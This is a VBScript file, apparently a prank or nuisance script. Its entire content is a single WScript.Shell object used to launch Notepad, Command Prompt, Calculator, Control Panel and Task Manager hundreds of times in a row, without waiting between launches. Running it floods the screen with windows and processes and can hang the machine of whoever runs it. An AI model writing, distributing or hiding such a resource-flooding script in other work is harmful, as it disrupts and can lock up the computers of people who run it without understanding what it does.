Set objShell = CreateObject("WScript.Shell")
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False
objShell.Run "cmd.exe", 1, False
objShell.Run "notepad.exe", 1, False

objShell.Run "calc.exe", 1, False

objShell.Run "control.exe", 1, False
objShell.Run "taskmgr.exe", 1, False
objShell.Run "calc.exe", 1, False
objShell.Run "cmd.exe", 1, False
